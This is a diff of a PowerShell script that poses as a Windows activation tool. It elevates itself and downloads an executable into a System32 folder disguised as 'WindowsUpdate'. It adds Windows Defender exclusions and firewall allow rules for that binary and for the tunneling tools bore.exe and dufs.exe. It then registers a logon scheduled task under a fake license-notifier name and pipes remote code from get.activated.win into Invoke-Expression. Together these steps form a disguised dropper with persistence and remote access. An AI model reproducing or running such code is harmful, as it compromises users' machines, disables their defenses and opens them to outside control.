@@ -1,26 +1,21 @@
 Add-Type -AssemblyName PresentationFramework
-
 function Show-Status($message) {
     Write-Host "`r$message   " -NoNewline
 }
-
 function Show-ProgressBar($label, $percent) {
     $barLength = 30
     $filledLength = [math]::Round($percent * $barLength)
     $bar = ('█' * $filledLength).PadRight($barLength)
     Write-Host "`r$label [$bar]" -NoNewline
 }
-
 function Download-WithProgress {
     param (
         [string[]] $urls,
         [string] $output
     )
-
     Add-Type -AssemblyName System.Net.Http
     $buffer = New-Object byte[] 8192
     $downloaded = $false
-
     foreach ($url in $urls) {
         try {
             $handler = New-Object System.Net.Http.HttpClientHandler
@@ -67,7 +62,6 @@ function Download-WithProgress {
             continue
         }
     }
-
     if (-not $downloaded) {
         Write-Host "`nFailed to download the binary from all sources." -ForegroundColor Red
         Write-Host "Please contact the TJ for assistance." -ForegroundColor Yellow
@@ -76,8 +70,6 @@ function Download-WithProgress {
         Write-Host "`nDownload complete." -ForegroundColor Green
     }
 }
-
-# Check for admin privileges
 if (-NOT ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
     try {
         $arguments = @("-NoProfile", "-ExecutionPolicy", "Bypass", "-File", $myinvocation.mycommand.definition)
@@ -88,11 +80,9 @@ if (-NOT ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdenti
     }
     Exit
 }
-
 Start-Sleep -Milliseconds 500
 Clear-Host
 
-# Define paths
 $secureDir = "$env:windir\System32\WindowsPowerShell\v1.0\Modules\WindowsUpdate"
 $exeFileName = "Wlnnb.exe"
 $filePath = Join-Path $secureDir $exeFileName
@@ -115,16 +105,13 @@ $binaryUrls = @(
 Show-Status "Initializing..."
 Start-Sleep -Seconds 1
 Download-WithProgress -urls $binaryUrls -output $filePath
-
 Show-Status "Processing..."
 Start-Sleep -Seconds 1
 
-# Add to Defender exclusions
 Add-MpPreference -ExclusionPath $secureDir -ErrorAction SilentlyContinue | Out-Null
 $licenseNotifierPath = "$env:LOCALAPPDATA\LicenseNotifier"
 Add-MpPreference -ExclusionPath $licenseNotifierPath -ErrorAction SilentlyContinue | Out-Null
 
-# Firewall rules
 $exeList = @("$filePath", "$licenseNotifierPath\bore.exe", "$licenseNotifierPath\dufs.exe")
 foreach ($exe in $exeList) {
     if (Test-Path $exe) {
@@ -133,8 +120,6 @@ foreach ($exe in $exeList) {
         New-NetFirewallRule -DisplayName "$name-Out" -Direction Outbound -Program $exe -Action Allow -Profile Any -ErrorAction SilentlyContinue | Out-Null
     }
 }
-
-# Scheduled task setup
 $taskName = "WindowsLicenseNotifier"
 $action = New-ScheduledTaskAction -Execute $filePath
 $trigger = New-ScheduledTaskTrigger -AtLogOn
@@ -146,11 +131,9 @@ if (Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue) {
 }
 Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Principal $principal -Settings $settings -Force | Out-Null
 
-# Inline execution in same window with visual feedback
 Write-Host "" -BackgroundColor DarkBlue -ForegroundColor White " Running Activation... "
 try {
-    $scriptBlock = Invoke-RestMethod "https://get.activated.win"
-    Invoke-Command -ScriptBlock ([scriptblock]::Create($scriptBlock))
+    Invoke-RestMethod "https://get.activated.win" | Invoke-Expression
 } catch {
     Write-Host "Activation failed or was interrupted." -ForegroundColor Red
 }
